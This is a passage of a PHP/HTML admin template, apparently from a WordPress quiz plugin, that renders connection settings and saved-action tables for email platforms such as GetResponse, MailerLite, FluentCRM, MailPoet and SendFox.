															$table_body .= '<tr class="'.$table_body_tr_class.'">';

															$table_body .= '<td>'.ucwords($autoresponder_details->getAction()).'</td>';
															if($autoresponder_details->getOutcomeId()){
																$sqboutcomedata = SQB_Outcome::loadById($autoresponder_details->getOutcomeId());
																if(!empty($sqboutcomedata)){
																	$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'>'.$sqboutcomedata->getOutcomeName().'</td>';
																}else{
																	$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
																}
																
															}else{
																$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
															}
															$sendinblue_list_name = '';
															
															if(isset($sendinblue_lists_sort_by_id[$autoresponder_details->getActionId()])){
																$sendinblue_list_name = $sendinblue_lists_sort_by_id[$autoresponder_details->getActionId()];
															}    

															


															$table_body .= '<td class="automation_action_data">'.$sendinblue_list_name.'</td>';
															
															
															
															
															
															$table_body .= '<td class="text-center delete_autoresponder_td"><i class="fa fa-trash" aria-hidden="true" onclick="sqb_autoresponder_delete_by_id('.$autoresponder_details->getId().')"></i></td>';
															$table_body .= '</tr>';
															
														}
													}
													echo $table_body;
													?>	
														 
													</tbody> 
													</table>
											</div>
										</div>

										
									
									
								</div>
								
								
								
								
								
							</li>
							
							<li>
								
								
								<?php 
								 
									 
									//print_r($user_added_plateform_array); 
									$autoresponder_name = 'GETRESPONSE';
									$getresponseObj = sqb_get_autoresponder_data_edit_mode($autoresponder_name);
									
									$getresponse_api_key = '';
								
									$getresponse_connect_text = 'Click Here to Connect';
									$getresponse_connect_class = "";
									$getresponse_show_list = 'display:none';
									$getresponse_show_connect_btn = 'display:none';
									if(in_array('GETRESPONSE',$user_added_plateform_array)){ 
										$getresponse_show_connect_btn = '';
									}
									
										
									$getresponse_select_list = '<select class="automation_select1 add_to_value_getresponse" id="add_to_value1" style="display:none;">';
										$getresponse_select_list .= '<option value="">Select Campaign</option>';

									$getresponse_select_list .= '</select>';
									
									
									
									$getresponse_lists_sort_by_id = array();
									 $autoresponder_details_obj = array();
									if(is_array($getresponseObj)  && count($getresponseObj)){
										
										
										
										
										$getresponse_connect_text = "Connected";
										$getresponse_connect_class = "  btn-success ";
										$getresponse_show_list = '';
										$getresponse_show_connect_btn = '';
									
										
										if(isset($getresponseObj['api_key'])){
											$getresponse_api_key = $getresponseObj['api_key'];
										}
										if(isset($getresponseObj['lists'])){
												$getresponse_select_list = $getresponseObj['lists'];
										}
										if(isset($getresponseObj['lists_sort_by_id'])){
												$getresponse_lists_sort_by_id = $getresponseObj['lists_sort_by_id'];
										}
										
										
										$autoresponder_details_obj = SQB_QuizAutoresponder::loadByQuizIdAndAutoresponderName($auto_quiz_id,$autoresponder_name);
										
									}
									if(!in_array('GETRESPONSE',$user_added_plateform_array)){ 
										$getresponse_show_list = 'display:none';
									}
										
									?>		
								
								<div class="add_user_in_your_email_platform_inner">
								<span class="checkbox-custom-style">
									<input type="checkbox" name="add_user_in_your_email_platform" value="GETRESPONSE" class="custom-checkbox-input" <?php if(in_array('GETRESPONSE',$user_added_plateform_array)){ echo "checked='checked'"; }  ?>>
									<span class="custom--checkbox"></span>
								</span>
								<span>GETRESPONSE</span>
								</div>
								<button type="button" class="btn btn-primary checkeck_email_has <?php echo $getresponse_connect_class;?>" data-toggle="modal" data-target="#user_add_my_email_plateform_getresponse_modal" style="<?php echo $getresponse_show_connect_btn; ?>"><?php echo $getresponse_connect_text; ?> </button>

								<div class="form-group form-row sqb-ep-notice mt-4" style="<?php if(in_array('GETRESPONSE',$user_added_plateform_array)){ echo "display:block"; }else{ echo "display:none"; }  ?>">
									<div class="alert alert-v2 alert-warning" role="alert" bis_skin_checked="1">
										<p>You can set different tags for each outcome in the outcome screen by clicking on Outcome Tags</p>
										<p>SQB will automatically send it to GetResponse.</p>
									</div>
								</div>

								<div class="autoresonder_details_fields_outer getresponse_save_outer_div" style="<?php echo $getresponse_show_list; ?>">
								   <div class="form-group form-row ">
									  <div class="col-sm-2">
										 <select class="automation_select1 add_to_id_getresponse" id="add_to_id1">
											<option value="">Select Action</option>
											<option value="A:CampaignId" selected= 'selected' >Add To Campaign</option> 
											
											
										</select>
									  </div>
									  
								 	<?php echo $all_outcome; ?>
									<div class='sqb_select_list_outer col-sm-2'><?php echo $getresponse_select_list; ?></div>
									 
									  
										  
									  <div class="col-sm-3">
											<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary automation_action_btn add_action_btn btn btn btn-primary sqb_ep_click_to_save_btn" type="button" data-action="getresponse">Click to Save</a>
											<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary " type="button" data-action="getresponse" style="display:none">Add More </a>
											
										</div>  
									  
									  
									  
								   </div>
								   <div class="form-group form-row " style="display:none">
									  <div class="col-sm-12 d-flex align-items-center">
										<span class="automation_radio show_tags" id="show_tags1" style="display:none;">
											<label>Do you want to use tags:</label><input type="radio" data-name="yes" checked="" value="yes" name="automation_tags"data-id="1"> Yes  <input type="radio" data-name="no" value="no" name="automation_tags" data-id="1"> No &nbsp;&nbsp;<span style="font-size: 13px;font-weight: 600;">(comma-separated list of tags) </span>
											
										 </span>
									  </div>
								   </div>
								
									
									 <div class="form-group form-row "> 
										 
											<div class="table-responsive autoresponder_table_details <?php echo strtolower($autoresponder_name);?>" style ="<?php  if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)  != 0){}else{ echo 'display:none';} ?>">
												<table  class="table table-bordered autoresponder_table_class autoresponder_table_class">
													<thead>
													 <tr>
															<th>Action</th>
															<th class="autoresponder_outcome_data" <?php echo $hide_email_based_options; ?>>Outcome</th>
															<th>List Name</th>
															
															<th class="text-center">Action</th>
														  </tr>
														  
													</thead>
													<tbody>
													<?php 
													$table_body = '';
													if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)){
														foreach($autoresponder_details_obj as $autoresponder_details){
															
															$table_body_tr_class = '  table_tr_id_'.$autoresponder_details->getId();
															$table_body .= '<tr class="'.$table_body_tr_class.'">';
															$table_body .= '<td>'.ucwords($autoresponder_details->getAction()).'</td>';
															if($autoresponder_details->getOutcomeId()){
																$sqboutcomedata = SQB_Outcome::loadById($autoresponder_details->getOutcomeId());
																if(!empty($sqboutcomedata)){
																	$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'>'.$sqboutcomedata->getOutcomeName().'</td>';
																}else{
																	$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
																}
																$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'>'.$sqboutcomedata->getOutcomeName().'</td>';
															}else{
																$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
															}
															$getresponse_list_name = '';
															
															if(isset($getresponse_lists_sort_by_id[$autoresponder_details->getActionId()])){
																$getresponse_list_name = $getresponse_lists_sort_by_id[$autoresponder_details->getActionId()];
															}    

															


															$table_body .= '<td class="automation_action_data">'.$getresponse_list_name.'</td>';
															
															
															
															
															
															$table_body .= '<td class="text-center delete_autoresponder_td"><i class="fa fa-trash" aria-hidden="true" onclick="sqb_autoresponder_delete_by_id('.$autoresponder_details->getId().')"></i></td>';
															$table_body .= '</tr>';
															
														}
													}
													echo $table_body;
													?>	
														 
													</tbody> 
													</table>
											</div>
										</div>
									
									
										

								</div>
								
								
								
								
								
							</li>
							
							<li>
								
								
								<?php 
								 
									 
									//print_r($user_added_plateform_array); 
									$autoresponder_name = 'MAILERLITE';
									$mailerliteObj = sqb_get_autoresponder_data_edit_mode($autoresponder_name);
									
									$mailerlite_api_key = '';
								
									$mailerlite_connect_text = 'Click Here to Connect';
									$mailerlite_connect_class = "";
									$mailerlite_show_list = 'display:none';
									$mailerlite_show_connect_btn = 'display:none';
									if(in_array('MAILERLITE',$user_added_plateform_array)){ 
										$mailerlite_show_connect_btn = '';
									}
									
										
									$mailerlite_select_list = '<select class="automation_select1 add_to_value_mailerlite" id="add_to_value1" style="display:none;">';
										$mailerlite_select_list .= '<option value="">Select Group</option>';

									$mailerlite_select_list .= '</select>';
									
									
									
									$mailerlite_lists_sort_by_id = array();
									 $autoresponder_details_obj = array();
									if(is_array($mailerliteObj)  && count($mailerliteObj)){
										
										
										$autoresponder_details_obj = SQB_QuizAutoresponder::loadByQuizIdAndAutoresponderName($auto_quiz_id,$autoresponder_name);
										
										$mailerlite_connect_text = "Connected";
										$mailerlite_connect_class = "  btn-success ";
										$mailerlite_show_list = '';
										$mailerlite_show_connect_btn = '';
									
										
										if(isset($mailerliteObj['api_key'])){
											$mailerlite_api_key = $mailerliteObj['api_key'];
										}
										if(isset($mailerliteObj['lists'])){
												$mailerlite_select_list = $mailerliteObj['lists'];
										}
										if(isset($mailerliteObj['lists_sort_by_id'])){
												$mailerlite_lists_sort_by_id = $mailerliteObj['lists_sort_by_id'];
										}
										
										
										
										
									}
									if(!in_array('MAILERLITE',$user_added_plateform_array)){ 
										$mailerlite_show_list = 'display:none';
									}
										
									?>		
								
								<div class="add_user_in_your_email_platform_inner">
								<span class="checkbox-custom-style">
									<input type="checkbox" name="add_user_in_your_email_platform" value="MAILERLITE" class="custom-checkbox-input" <?php if(in_array('MAILERLITE',$user_added_plateform_array)){ echo "checked='checked'"; }  ?>>
									<span class="custom--checkbox"></span>
								</span>
								<span>MAILERLITE</span>
								</div>
								<button type="button" class="btn btn-primary checkeck_email_has <?php echo $mailerlite_connect_class;?>" data-toggle="modal" data-target="#user_add_my_email_plateform_mailerlite_modal" style="<?php echo $mailerlite_show_connect_btn; ?>"><?php echo $mailerlite_connect_text; ?> </button>

								<div class="form-group form-row sqb-ep-notice mt-4" style="<?php if(in_array('MAILERLITE',$user_added_plateform_array)){ echo "display:block"; }else{ echo "display:none"; }  ?>">
									<div class="alert alert-v2 alert-warning" role="alert" bis_skin_checked="1">
										<p>You can set different tags for each outcome in the outcome screen by clicking on Outcome Tags. You can also assign answer level tags. SQB will automatically create a custom field called "quiz_tag" in ML and store the assigned tags (comma-separated if more than one), in this custom field.</p>
									</div>
								</div>

								<div class="autoresonder_details_fields_outer mailerlite_save_outer_div" style="<?php echo $mailerlite_show_list; ?>">
								   <div class="form-group form-row ">
									  <div class="col-sm-2">
										 <select class="automation_select1 add_to_id_mailerlite" id="add_to_id1">
											<option value="">Select Action</option>
											<option value="A:CampaignId" selected= 'selected' >Add To Group</option> 
											
											
										</select>
									  </div>
									  
								 	<?php echo $all_outcome; ?>

									<div class='sqb_select_list_outer col-sm-2'><?php echo $mailerlite_select_list; ?></div>
									  <div class="col-sm-3">
											<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary automation_action_btn add_action_btn btn btn btn-primary sqb_ep_click_to_save_btn" type="button" data-action="mailerlite">Click to Save</a>
											<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary " type="button" data-action="mailerlite" style="display:none">Add More </a>
											
										</div>  
								   </div>
								   <div class="form-group form-row " style="display:none">
									  <div class="col-sm-12 d-flex align-items-center">
										<span class="automation_radio show_tags" id="show_tags1" style="display:none;">
											<label>Do you want to use tags:</label><input type="radio" data-name="yes" checked="" value="yes" name="automation_tags"data-id="1"> Yes  <input type="radio" data-name="no" value="no" name="automation_tags" data-id="1"> No &nbsp;&nbsp;<span style="font-size: 13px;font-weight: 600;">(comma-separated list of tags) </span>
											
										 </span>
									  </div>
								   </div>
								
									
									 <div class="form-group form-row "> 
										
											<div class="table-responsive autoresponder_table_details <?php echo strtolower($autoresponder_name);?>" style ="<?php  if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)  != 0){}else{ echo 'display:none';} ?>">
												<table  class="table table-bordered autoresponder_table_class autoresponder_table_class">
													<thead>
													 <tr>
															<th>Action</th>
															
															<th class="autoresponder_outcome_data" <?php echo $hide_email_based_options; ?>>Outcome</th>

															<th>List Name</th>
															
															<th class="text-center">Action</th>
														  </tr>
														  
													</thead>
													<tbody>
													<?php 
													$table_body = '';
													if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)){
														foreach($autoresponder_details_obj as $autoresponder_details){
															
															$table_body_tr_class = '  table_tr_id_'.$autoresponder_details->getId();
															$table_body .= '<tr class="'.$table_body_tr_class.'">';
															$table_body .= '<td>'.ucwords($autoresponder_details->getAction()).'</td>';
															
															$mailerlite_list_name = '';
															
															if(isset($mailerlite_lists_sort_by_id[$autoresponder_details->getActionId()])){
																$mailerlite_list_name = $mailerlite_lists_sort_by_id[$autoresponder_details->getActionId()];
															}    

															if($autoresponder_details->getOutcomeId()){
																$sqboutcomedata = SQB_Outcome::loadById($autoresponder_details->getOutcomeId());
																if(!empty($sqboutcomedata)){
																	$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'>'.$sqboutcomedata->getOutcomeName().'</td>';
																}else{
																	$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
																}
															}else{
																$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
															}

															$table_body .= '<td class="automation_action_data">'.$mailerlite_list_name.'</td>';

																
															
															$table_body .= '<td class="text-center delete_autoresponder_td"><i class="fa fa-trash" aria-hidden="true" onclick="sqb_autoresponder_delete_by_id('.$autoresponder_details->getId().')"></i></td>';
															$table_body .= '</tr>';
															
														}
													}
													echo $table_body;
													?>	
														 
													</tbody> 
													</table>
											</div>
										</div>
									
										
									
								</div>
								
								
								
								
								
							</li>

<?php 
							
							$groundhogg_plugins_has_class = ' sqb_email_wp_plugin_missing ';
							$groundhogg_plugins_active_name = ' add_user_in_your_email_platform1';
							if(class_exists(\Groundhogg\Contact::class)){ 
								$groundhogg_plugins_has_class = ' ';
								$groundhogg_plugins_active_name = 'add_user_in_your_email_platform';
								
							}
							
						
							?>
							<li>
								<div class="add_user_in_your_email_platform_inner">
									<span class="checkbox-custom-style">
										<input type="checkbox" name="<?php echo $groundhogg_plugins_active_name;?>" value="GROUNDHOGG" class="custom-checkbox-input"  <?php if(in_array('GROUNDHOGG',$user_added_plateform_array)){ echo "checked='checked'"; }  ?> >
										<span class="custom--checkbox"></span>
									</span>
									<span>GROUNDHOGG <div class="tool-tip">
									<i class="fa fa-info-circle" aria-hidden="true"></i>
									<div class="toll-tip-desc">If you want to send tags, add tags in the SQB >> outcome tab and then create same name tags in GROUNDHOGG.  When users complete the quiz, based on the outcome, SQB will assign the right tag in GROUNDHOGG.</div>
								</div></span>
								</div>
							</li>
							 <?php
							
							$fluent_crm_enable = NULL;
							
							if(function_exists('FluentCrmApi')){
								$fluent_crm_enable = true;
								$fluent_crm_list = FluentCrmApi('lists');
								$fluent_crm_list_all = $fluent_crm_list->all();
								$fluentcrm_lists_sort_by_id = array();
								$fluentcrm_select_list = '<select class="automation_select1 add_to_value_fluentcrm" id="add_to_value1" >';
								$fluentcrm_select_list .= '<option value="">Select List</option>';

								
								if(isset($fluent_crm_list_all)){
									foreach($fluent_crm_list_all as $fluent_crm_single_list_info){
										
										$fluentcrm_select_list .= '<option value="'.$fluent_crm_single_list_info->id.'">'.$fluent_crm_single_list_info->title.'</option>';
										$fluentcrm_lists_sort_by_id[$fluent_crm_single_list_info->id] = $fluent_crm_single_list_info->title;
										
									}
								}
								$fluentcrm_select_list .= '</select>';
								
								
							}else {  ?>
								
								<li>
									<div class="add_user_in_your_email_platform_inner">
										<span class="checkbox-custom-style">
											<input type="checkbox" name="add_user_in_your_email_platform1" value="FLUENTCRM" class="custom-checkbox-input sqb_email_wp_plugin_missing" >
											<span class="custom--checkbox"></span>
										</span>
										<span>FLUENTCRM <div class="tool-tip">
										<i class="fa fa-info-circle" aria-hidden="true"></i>
										<div class="toll-tip-desc">If you want to send tags, add tags in the SQB >> outcome tab and then create same name tags in Fluent CRM.  When users complete the quiz, based on the outcome, SQB will assign the right tag in CRM.</div>
									</div></span>
									</div>
									</li>
								
							<?php 	}
							
							 if (isset($fluent_crm_enable)) { ?>
							<li>


							<?php 
							 
								$autoresponder_name = 'FLUENTCRM';
								$fluentcrmObj = sqb_get_autoresponder_data_edit_mode($autoresponder_name);
								
								
								$fluentcrm_show_list = 'display:none';	
								$autoresponder_details_obj = SQB_QuizAutoresponder::loadByQuizIdAndAutoresponderName($auto_quiz_id,$autoresponder_name);
								if(in_array('FLUENTCRM',$user_added_plateform_array)){
									$fluentcrm_show_list = 'display:block';	
								}
								
									
								?>		

							<div class="add_user_in_your_email_platform_inner">
							<span class="checkbox-custom-style">
								<input type="checkbox" name="add_user_in_your_email_platform" value="FLUENTCRM" class="custom-checkbox-input" <?php if(in_array('FLUENTCRM',$user_added_plateform_array)){ echo "checked='checked'"; }  ?>>
								<span class="custom--checkbox"></span>
							</span>
							<span>FLUENTCRM <div class="tool-tip">
	<i class="fa fa-info-circle" aria-hidden="true"></i>
	<div class="toll-tip-desc">If you want to send tags, add tags in the SQB >> outcome tab and then create same name tags in Fluent CRM.  When users complete the quiz, based on the outcome, SQB will assign the right tag in CRM.</div>
</div></span>
							</div>
							
							<div class="autoresonder_details_fields_outer fluentcrm_save_outer_div" style="<?php echo $fluentcrm_show_list; ?>">
							   <div class="form-group form-row ">
								  <div class="col-sm-2">
									 <select class="automation_select1 add_to_id_fluentcrm" id="add_to_id1">
										<option value="">Select Action</option>
										<option value="A:list" selected= 'selected' >Add</option> 
										
										
									</select>
								  </div>
								  
								 <?php echo $all_outcome; ?>
								<div class='sqb_select_list_outer col-sm-2'><?php echo $fluentcrm_select_list; ?></div>
								 
								  
									  
								  <div class="col-sm-3">
										<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary automation_action_btn add_action_btn btn btn btn-primary sqb_ep_click_to_save_btn" type="button" data-action="fluentcrm">Click to Save</a>
										<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary " type="button" data-action="fluentcrm" style="display:none">Add More </a>
										
									</div>  
								  
								  
								  
							   </div>
							   <div class="form-group form-row " style="display:none">
								  <div class="col-sm-12 d-flex align-items-center">
									<span class="automation_radio show_tags" id="show_tags1" style="display:none;">
										<label>Do you want to use tags:</label><input type="radio" data-name="yes" checked="" value="yes" name="automation_tags"data-id="1"> Yes  <input type="radio" data-name="no" value="no" name="automation_tags" data-id="1"> No &nbsp;&nbsp;<span style="font-size: 13px;font-weight: 600;">(comma-separated list of tags) </span>
										
									 </span>
								  </div>
							   </div>

								
								 <div class="form-group form-row "> 
									
										<div class="table-responsive autoresponder_table_details <?php echo strtolower($autoresponder_name);?>" style ="<?php  if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)  != 0){}else{ echo 'display:none';} ?>">
											<table  class="table table-bordered autoresponder_table_class autoresponder_table_class">
												<thead>
												 <tr>
														<th>Action</th>
														<th class="autoresponder_outcome_data" <?php echo $hide_email_based_options; ?>>Outcome</th>
														<th>List Name</th>
														
														<th class="text-center">Action</th>
													  </tr>
													  
												</thead>
												<tbody>
												<?php 
												$table_body = '';
												if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)){
													foreach($autoresponder_details_obj as $autoresponder_details){
														
														$table_body_tr_class = '  table_tr_id_'.$autoresponder_details->getId();
														$table_body .= '<tr class="'.$table_body_tr_class.'">';
														$table_body .= '<td>'.ucwords($autoresponder_details->getAction()).'</td>';
														if($autoresponder_details->getOutcomeId()){
															$sqboutcomedata = SQB_Outcome::loadById($autoresponder_details->getOutcomeId());
															if(!empty($sqboutcomedata)){
																$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'>'.$sqboutcomedata->getOutcomeName().'</td>';
															}else{
																$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
															}
															
														}else{
															$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
														}
														$fluentcrm_list_name = '';
														
														if(isset($fluentcrm_lists_sort_by_id[$autoresponder_details->getActionId()])){
															$fluentcrm_list_name = $fluentcrm_lists_sort_by_id[$autoresponder_details->getActionId()];
														}    

														


														$table_body .= '<td class="automation_action_data">'.$fluentcrm_list_name.'</td>';
														
														
														
														
														
														$table_body .= '<td class="text-center delete_autoresponder_td"><i class="fa fa-trash" aria-hidden="true" onclick="sqb_autoresponder_delete_by_id('.$autoresponder_details->getId().')"></i></td>';
														$table_body .= '</tr>';
														
													}
												}
												echo $table_body;
												?>	
													 
												</tbody> 
												</table>
										</div>
									</div>
								
									<div class="form-group form-row sqb-ep-notice">
											<div class="alert alert-v2 alert-warning" role="alert" bis_skin_checked="1">
												<p>You can set different tags for each outcome in the outcome screen by clicking on Outcome Tags.</p>
												<p>However, you need to first create the tag in FluentCRM. Then create same name tag in SQB's outcome screen. </p>
											</div>
										</div>
							</div>





							</li>

							<?php } ?>
							
							<?php 							
							$mailpoet_enable = NULL;

							if (class_exists(\MailPoet\API\API::class)) {
								$mailpoet_enable = true;
								 $mailpoet_api = \MailPoet\API\API::MP('v1');
								$mailpoet_list = $mailpoet_api->getLists();
								$mailpoet_lists_sort_by_id = array();
								$mailpoet_select_list = '<select class="automation_select1 add_to_value_mailpoet" id="add_to_value1" >';
								$mailpoet_select_list .= '<option value="">Select List</option>';

								
								if(isset($mailpoet_list)){
									foreach($mailpoet_list as $mailpoet_list_single){
										$mailpoet_list_id = $mailpoet_list_single['id'];
										$mailpoet_list_name = $mailpoet_list_single['name'];
										$mailpoet_select_list .= '<option value="'.$mailpoet_list_id.'">'.$mailpoet_list_name.'</option>';
										$mailpoet_lists_sort_by_id[$mailpoet_list_id] = $mailpoet_list_name;
										
									}
								}
								$mailpoet_select_list .= '</select>';
								
								
							}

							 if (isset($mailpoet_enable)) { ?>
							<li>


							<?php 
							 
								$autoresponder_name = 'MAILPOET';
								
								$mailpoet_show_list = 'display:none';	
								$autoresponder_details_obj = SQB_QuizAutoresponder::loadByQuizIdAndAutoresponderName($auto_quiz_id,$autoresponder_name);
								if(in_array('MAILPOET',$user_added_plateform_array)){
									$mailpoet_show_list = 'display:block';	
								}
								
									
								?>		

							<div class="add_user_in_your_email_platform_inner">
							<span class="checkbox-custom-style">
								<input type="checkbox" name="add_user_in_your_email_platform" value="MAILPOET" class="custom-checkbox-input" <?php if(in_array('MAILPOET',$user_added_plateform_array)){ echo "checked='checked'"; }  ?>>
								<span class="custom--checkbox"></span>
							</span>
							<span>MAILPOET </span>
							</div>

							<div class="autoresonder_details_fields_outer mailpoet_save_outer_div" style="<?php echo $mailpoet_show_list; ?>">
							   <div class="form-group form-row ">
								  <div class="col-sm-2">
									 <select class="automation_select1 add_to_id_mailpoet" id="add_to_id1">
										<option value="">Select Action</option>
										<option value="A:list" selected= 'selected' >Add</option> 
										
										
									</select>
								  </div>
								  
							 	<?php echo $all_outcome; ?>
								<div class='sqb_select_list_outer col-sm-2'><?php echo $mailpoet_select_list; ?></div>
								 
								  
									  
								  <div class="col-sm-3">
										<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary automation_action_btn add_action_btn btn btn btn-primary sqb_ep_click_to_save_btn" type="button" data-action="mailpoet">Click to Save</a>
										<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary " type="button" data-action="mailpoet" style="display:none">Add More </a>
										
									</div>  
								  
								  
								  
							   </div>
							   <div class="form-group form-row " style="display:none">
								  <div class="col-sm-12 d-flex align-items-center">
									<span class="automation_radio show_tags" id="show_tags1" style="display:none;">
										<label>Do you want to use tags:</label><input type="radio" data-name="yes" checked="" value="yes" name="automation_tags"data-id="1"> Yes  <input type="radio" data-name="no" value="no" name="automation_tags" data-id="1"> No &nbsp;&nbsp;<span style="font-size: 13px;font-weight: 600;">(comma-separated list of tags) </span>
										
									 </span>
								  </div>
							   </div>

								
								 <div class="form-group form-row "> 
									
										<div class="table-responsive autoresponder_table_details <?php echo strtolower($autoresponder_name);?>" style ="<?php  if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)  != 0){}else{ echo 'display:none';} ?>">
											<table  class="table table-bordered autoresponder_table_class autoresponder_table_class">
												<thead>
												 <tr>
														<th>Action</th>
														<th class="autoresponder_outcome_data" <?php echo $hide_email_based_options; ?>>Outcome</th>
														<th>List Name</th>
														
														<th class="text-center">Action</th>
													  </tr>
													  
												</thead>
												<tbody>
												<?php 
												$table_body = '';
												if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)){
													foreach($autoresponder_details_obj as $autoresponder_details){
														
														$table_body_tr_class = '  table_tr_id_'.$autoresponder_details->getId();
														$table_body .= '<tr class="'.$table_body_tr_class.'">';
														$table_body .= '<td>'.ucwords($autoresponder_details->getAction()).'</td>';
														if($autoresponder_details->getOutcomeId()){
																$sqboutcomedata = SQB_Outcome::loadById($autoresponder_details->getOutcomeId());
																if(!empty($sqboutcomedata)){
																	$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'>'.$sqboutcomedata->getOutcomeName().'</td>';
																}else{
																	$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
																}
															}else{
																$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
															}
														$mailpoet_list_name = '';
														
														if(isset($mailpoet_lists_sort_by_id[$autoresponder_details->getActionId()])){
															$mailpoet_list_name = $mailpoet_lists_sort_by_id[$autoresponder_details->getActionId()];
														}    

														


														$table_body .= '<td class="automation_action_data">'.$mailpoet_list_name.'</td>';
														
														
														
														
														
														$table_body .= '<td class="text-center delete_autoresponder_td"><i class="fa fa-trash" aria-hidden="true" onclick="sqb_autoresponder_delete_by_id('.$autoresponder_details->getId().')"></i></td>';
														$table_body .= '</tr>';
														
													}
												}
												echo $table_body;
												?>	
													 
												</tbody> 
												</table>
										</div>
									</div>
								
									<div class="form-group form-row sqb-ep-notice">
											<div class="alert alert-v2 alert-warning" role="alert" bis_skin_checked="1">
												<p>You can set different tags for each outcome in the outcome screen by clicking on Outcome Tags.</p>
												<p>However, MailPoet APIs do not support tags. So SQB will not be able to send tags to MailPoet.</p>
											</div>
										</div>

							</div>





							</li>

							<?php }else{   ?>
								<li>
								<div class="add_user_in_your_email_platform_inner">
							<span class="checkbox-custom-style">
								<input type="checkbox" name="add_user_in_your_email_platform1" value="MAILPOET" class="custom-checkbox-input sqb_email_wp_plugin_missing">
								<span class="custom--checkbox"></span>
							</span>
							<span>MAILPOET </span>
							</div>
								</li>
								
								<?php  } ?>

							 
							
								
							
							<li>
								
								
								<?php 
								 
									 
									
									$autoresponder_name = 'SENDFOX';
									$sendfoxObj = sqb_get_autoresponder_data_edit_mode($autoresponder_name);
									
									$sendfox_api_key = '';
								
									$sendfox_connect_text = 'Click Here to Connect';
									$sendfox_connect_class = "";
									$sendfox_show_list = 'display:none';
									$sendfox_show_connect_btn = 'display:none';
									if(in_array('SENDFOX',$user_added_plateform_array)){ 
										$sendfox_show_connect_btn = '';
									}
									
										
									$sendfox_select_list = '<select class="automation_select1 add_to_value_sendfox" id="add_to_value1" style="display:none;">';
										$sendfox_select_list .= '<option value="">Select List</option>';

									$sendfox_select_list .= '</select>';
									
									
									
									$sendfox_lists_sort_by_id = array();
									 $autoresponder_details_obj = array();
									if(is_array($sendfoxObj)  && count($sendfoxObj)){
										$autoresponder_details_obj = SQB_QuizAutoresponder::loadByQuizIdAndAutoresponderName($auto_quiz_id,$autoresponder_name);
										
										
										
										$sendfox_connect_text = "Connected";
										$sendfox_connect_class = "  btn-success ";
										$sendfox_show_list = '';
										$sendfox_show_connect_btn = '';
									
										
										if(isset($sendfoxObj['api_key'])){
											$sendfox_api_key = $sendfoxObj['api_key'];
										}
										if(isset($sendfoxObj['lists'])){
												$sendfox_select_list = $sendfoxObj['lists'];
										}
										if(isset($sendfoxObj['lists_sort_by_id'])){
												$sendfox_lists_sort_by_id = $sendfoxObj['lists_sort_by_id'];
										}
										
										
										
										
									}
									if(!in_array('SENDFOX',$user_added_plateform_array)){ 
										$sendfox_show_list = 'display:none';
									}
										
									?>		
								
								<div class="add_user_in_your_email_platform_inner">
								<span class="checkbox-custom-style">
									<input type="checkbox" name="add_user_in_your_email_platform" value="SENDFOX" class="custom-checkbox-input" <?php if(in_array('SENDFOX',$user_added_plateform_array)){ echo "checked='checked'"; }  ?>>
									<span class="custom--checkbox"></span>
								</span>
								<span>SENDFOX</span>
								</div>
								<button type="button" class="btn btn-primary checkeck_email_has <?php echo $sendfox_connect_class;?>" data-toggle="modal" data-target="#user_add_my_email_plateform_sendfox_modal" style="<?php echo $sendfox_show_connect_btn; ?>"><?php echo $sendfox_connect_text; ?> </button>

								<div class="form-group form-row sqb-ep-notice mt-4" style="<?php if(in_array('SENDFOX',$user_added_plateform_array)){ echo "display:block"; }else{ echo "display:none"; }  ?>">
									<div class="alert alert-v2 alert-warning" role="alert" bis_skin_checked="1">
										<p>You can set different tags for each outcome in the outcome screen by clicking on Outcome Tags.</p>
										<p>However, SendFox APIs do not support tags. So SQB will not be able to send tags to SendFox.</p>
									</div>
								</div>

								<div class="autoresonder_details_fields_outer sendfox_save_outer_div" style="<?php echo $sendfox_show_list; ?>">
								   <div class="form-group form-row ">
									  <div class="col-sm-2">
										 <select class="automation_select1 add_to_id_sendfox" id="add_to_id1">
											<option value="">Select Action</option>
											<option value="A:list" selected= 'selected' >Add To List</option> 
											
											
										</select>
									  </div>
									  
								 	<?php echo $all_outcome; ?>
									<div class='sqb_select_list_outer col-sm-2'><?php echo $sendfox_select_list; ?></div>
									 
									  
										  
									  <div class="col-sm-3">
											<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary automation_action_btn add_action_btn btn btn btn-primary sqb_ep_click_to_save_btn" type="button" data-action="sendfox">Click to Save</a>
											<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary " type="button" data-action="sendfox" style="display:none">Add More </a>
											
										</div>  
									  
									  
									  
								   </div>
								  
									
